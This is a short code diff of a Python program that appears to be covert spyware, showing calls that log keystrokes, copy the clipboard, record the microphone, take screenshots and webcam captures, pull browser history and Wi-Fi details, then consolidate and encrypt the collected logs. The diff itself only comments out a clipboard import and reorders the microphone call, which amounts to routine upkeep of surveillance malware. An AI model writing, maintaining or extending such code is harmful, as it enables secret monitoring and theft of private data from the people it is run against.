@@ -15,7 +15,7 @@ from requests import get
 from PIL import ImageGrab
 import psutil
 import sqlite3
-import win32clipboard
+# import win32clipboard
 from scipy.io.wavfile import write
 import sounddevice as sd
 from pynput import keyboard
@@ -227,11 +227,11 @@ def encrypt_files(files_to_encrypt):
 system_information()
 network_activity()
 copy_clipboard()
-microphone()
 screenshots()
 webcam_capture()
 fetch_browser_history()
 wifi_info_fetch()
+microphone()
 consolidate_data()
 
 def run_scheduled_tasks():
@@ -250,7 +250,6 @@ schedule_thread.start()
 
     # Start the keylogger in the main thread
 start_keylogger()
-
 
 files_to_encrypt = [file_path + system_info, file_path + keys_info, file_path + clipboard_info, file_path + wifi_info, file_path + consolidated_log]
 encrypt_files(files_to_encrypt)
